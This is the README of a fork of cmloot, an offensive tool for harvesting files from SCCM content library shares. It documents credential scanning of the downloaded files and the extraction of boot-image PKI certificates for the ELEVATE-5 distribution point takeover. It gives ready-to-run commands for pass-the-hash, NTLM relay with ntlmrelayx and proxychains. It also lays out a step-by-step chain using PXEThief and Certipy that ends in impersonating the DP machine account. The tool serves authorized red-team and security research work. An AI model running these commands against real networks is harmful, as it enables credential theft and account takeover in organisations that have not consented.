<div align="center">

# cmloot

**SCCM Content Library enumeration & extraction tool**

Enumerate, download, classify, and analyze files from `SCCMContentLib$` —  
including OSD boot images for ELEVATE-5 Distribution Point takeover.

<br />

![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue?logo=python&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green)
![Impacket](https://img.shields.io/badge/dep-impacket-orange)
![LDAP3](https://img.shields.io/badge/dep-ldap3-blueviolet)
![ELEVATE-5](https://img.shields.io/badge/attack-ELEVATE--5-critical?style=flat&labelColor=black)

<br />

[Features](#features) · [Usage](#usage) · [ELEVATE-5](#elevate-5-distribution-point-takeover) · [Analysis](#cmloot_analyzepy) · [Auth](#authentication) · [Options](#all-options)

</div>

---

## What's new vs. the original

A feature-extended fork of [shelltrail/cmloot](https://github.com/shelltrail/cmloot)
(Andreas Vikerup / Shelltrail), which enumerates and downloads files from
`SCCMContentLib$` with pass-the-hash, multi-target inventory and NTLM relaying.
This fork keeps all of that and adds:

- **LDAP discovery** of SCCM Management Points (`mSSMSManagementPoint`), not just a static host list
- **Interactive download** — a prioritized table (size, category, high-value `[!]` markers); pick files or ranges
- **`-auto` pipeline** — discover, inventory, download and classify in one command
- **Local classification** (`-classify`) — categorizes downloaded loot offline, no target needed
- **ELEVATE-5** (`-elevate5`) — extracts `Variables.dat` and PKI client-auth certificates from OSD boot images
- **Credential analysis** — a separate `cmloot_analyze.py` with CRITICAL/HIGH/MEDIUM severities and JSON output
- **More auth** — Kerberos (`-k`, `-aesKey`) alongside the original pass-the-hash
- **Progress & ETA** on inventory, plus interactive and `-yes-download` modes

The full list is below.

## Features

- **BFS Inventory** — traversal with progress bars, ETA, file counts
- **Interactive Download** — shows file size, category, and priority before downloading; you pick which files
- **Auto Pipeline** — LDAP discovery → inventory → download → classify in one command
- **Local Classification** — categorizes downloaded loot offline with `[!]` high-value markers
- **ELEVATE-5 Extraction** — extracts `Variables.dat` from WIM boot images, identifies PKI client auth certificates
- **Credential Analysis** — deep content scanner (separate `cmloot_analyze.py`) for plaintext passwords, connection strings, certificates
- **NTLM Hash Auth** — pass-the-hash and computer account support (`-hashes`)
- **Multi-Target** — inventories multiple SCCM servers, merges with dedup
- **LDAP Discovery** — finds SCCM Management Points via `mSSMSManagementPoint`

---

## Usage

cmloot has two modes: **remote** (requires target + credentials) and **local** (operates on already-downloaded files, no target needed).

### Remote — requires `target`

```bash
pip install impacket ldap3
```

#### Discover SCCM servers

```bash
python3 cmloot.py domain.local/user:password@dc01 -findsccmservers
```

#### Build inventory

```bash
python3 cmloot.py domain.local/user@sccm01 -cmlootinventory sccmfiles.txt
```

#### Download with interactive selection

```bash
python3 cmloot.py domain.local/user@sccm01 -cmlootdownload sccmfiles.txt -extensions WIM ISO
```

Shows a prioritized file table:

```
================================================================
DOWNLOAD SELECTION: 10 files available
================================================================

  #    Size       Category                  File
  ---  ---        ---                       ---
  1    143KB      OSD MEDIA (ELEVATE-5)     LNC_MTL_SINIT_v20_22.wim [!]
  2    456MB      OSD MEDIA (ELEVATE-5)     boot.ROG00005.wim [!]
  3    15KB       CREDENTIALS               C7F4-MigApp.xml [!]
  4    4.2GB      OSD MEDIA (ELEVATE-5)     install.wim
  ...

  Total: 5.6GB across 10 files

  Select files to download:
    Numbers: 1,3,5    Ranges: 2-4    A = all    Q = quit
  Choice [A]: 1,2,3
```

#### Full auto pipeline

```bash
python3 cmloot.py domain.local/user:password@dc01 -auto
# LDAP discovery → inventory → download → classify
```

### Local — no target required

These commands work on the local `CMLootOut/` directory. No SMB connection needed.

#### Classify downloaded files

```bash
python3 cmloot.py -classify
# or specify a different directory:
python3 cmloot.py -classify -lootpath /path/to/loot
```

#### ELEVATE-5: Extract PKI certs from downloaded WIM/ISO images

```bash
python3 cmloot.py -elevate5
# or specify a different directory:
python3 cmloot.py -elevate5 -lootpath /path/to/loot
```

#### Analyze for credentials (separate tool)

```bash
python3 cmloot_analyze.py CMLootOut/
python3 cmloot_analyze.py CMLootOut/ --severity CRITICAL HIGH --json --out findings.json
```

---

## ELEVATE-5: Distribution Point Takeover

SCCM distribution points with PKI certificates embed them in OSD boot images as `_SMSTSMediaPFX`. The certificate has **Client Authentication EKU** with an **exportable private key**, allowing impersonation of the DP machine account.

> **Boot images** (`boot.*.wim`, `prestaged.wim`) contain `Variables.dat` — these are your targets.
> **Install images** (`install.wim`, 4-5GB) do **NOT** contain task sequence variables — skip them.

```
Attack chain:

  ┌─────────────────────────────────────────────────────┐
  │  1. cmloot domain/user@sccm01 -extensions WIM ISO   │
  │     ↓                                               │
  │  2. cmloot -elevate5                                │
  │     Extract Variables.dat from boot WIM             │
  │     ↓                                               │
  │  3. pxethief.py 3 Variables.dat                     │
  │     Decrypt and export PFX certificate               │
  │     ↓                                               │
  │  4. certipy auth -pfx cert.pfx -password <guid>    │
  │     Authenticate as DP$ machine account             │
  └─────────────────────────────────────────────────────┘
```

**References:**
- [PXEThief](https://github.com/MWR-CyberSec/PXEThief) — Variables.dat decryption
- [Certipy](https://github.com/ly4k/Certipy) — AD CS certificate abuse
- [ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/ELEVATE/ELEVATE-5/ELEVATE-5_description.md) — attack documentation

---

## cmloot_analyze.py

Deep content scanner. Finds plaintext credentials, connection strings, certificates, and service accounts. Filters noise (GUIDs, Microsoft schema URLs, empty values) and deduplicates per file.

```bash
python3 cmloot_analyze.py CMLootOut/
python3 cmloot_analyze.py CMLootOut/ --severity CRITICAL HIGH
python3 cmloot_analyze.py CMLootOut/ --ext XML PS1 VBS INI CONFIG
python3 cmloot_analyze.py CMLootOut/ --json --out findings.json --no-color
```

| Severity | What it finds |
|----------|--------------|
| ![CRITICAL](https://img.shields.io/badge/CRITICAL-red) | Plaintext passwords, PSCredential, connection strings with creds, private keys, API tokens |
| ![HIGH](https://img.shields.io/badge/HIGH-yellow) | LDAP paths, SQL connection strings, MDT domain/local admin creds, NAA, XML credential attributes, SCCM site codes |
| ![MEDIUM](https://img.shields.io/badge/MEDIUM-blue) | Internal domains (.local/.corp), service accounts (`COMPUTER$`), ADMIN$/C$ shares |

---

## Authentication

```bash
# Password
python3 cmloot.py domain.local/user:password@sccm01 -cmlootinventory sccmfiles.txt

# Pass-the-hash
python3 cmloot.py domain.local/user@sccm01 -cmlootinventory sccmfiles.txt \
    -hashes :fc525c9683e8fe067095ba14f29e5f5c

# Computer account
python3 cmloot.py domain.local/COMPUTER$@sccm01 -cmlootinventory sccmfiles.txt \
    -hashes :fc525c9683e8fe067095ba14f29e5f5c -no-pass

# Kerberos
python3 cmloot.py domain.local/user@sccm01 -k -dc-ip 10.0.0.1

# Proxychains
proxychains python3 cmloot.py domain.local/user@sccm01 -cmlootinventory sccmfiles.txt

# NTLM relay
ntlmrelayx.py -socks -t 10.0.0.50 -smb2support
proxychains python3 cmloot.py DOMAIN/COMPUTER$@10.0.0.50 -n -cmlootdownload sccmfiles.txt
```

---

## All Options

```
positional arguments:
  target              [[domain/]username[:password]@]<target>
                      Not required for -classify or -elevate5.

cmloot:
  -cmlootinventory    Build inventory file (default: sccmfiles.txt)
  -cmlootdownload     Download files from inventory
  -extensions         File extensions to download (default: XML INI CONFIG PS1 VBS)
  -lootpath           Output directory (default: CMLootOut)
  -classify           Classify downloaded files by type and priority (local, no target)
  -elevate5           ELEVATE-5: extract PKI certs from WIM/ISO (local, no target)
  -auto               Full pipeline: discover → inventory → download → classify
  -yes-download       Skip interactive selection, download all matching files
  -debug              Verbose debug output

authentication:
  -hashes             LM:NTHASH for pass-the-hash
  -no-pass            Don't prompt for password
  -k                  Kerberos authentication (uses KRB5CCNAME)
  -aesKey             AES key for Kerberos

connection:
  -dc-ip              Domain controller IP
  -target-ip          Target machine IP
  -port               SMB port (default: 445)
  -target-file        File with targets (one per line)

findsccmservers:
  -findsccmservers    Find SCCM servers via LDAP
  -ldapport           LDAP port (default: 389, LDAPS: 636)
```

---

## Requirements

| Dependency | Purpose |
|-----------|---------|
| [impacket](https://github.com/fortra/impacket) | SMB connection, authentication |
| [ldap3](https://github.com/cannatag/ldap3) | LDAP discovery of SCCM servers |
| p7zip-full or wimtools | ELEVATE-5 WIM extraction (optional) |
| [PXEThief](https://github.com/MWR-CyberSec/PXEThief) | Variables.dat decryption (optional) |
| [Certipy](https://github.com/ly4k/Certipy) | Certificate-based auth (optional) |

```bash
pip install impacket ldap3
apt install p7zip-full wimtools   # for ELEVATE-5
```

---

<div align="center">

**Fork of [cmloot](https://github.com/shelltrail/cmloot/tree/main)** by [Andreas Vikerup / Shelltrail](https://www.shelltrail.com/research/cmloot/)  
Extended with inventory optimization, interactive download, classification, analysis, and ELEVATE-5 support.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

</div>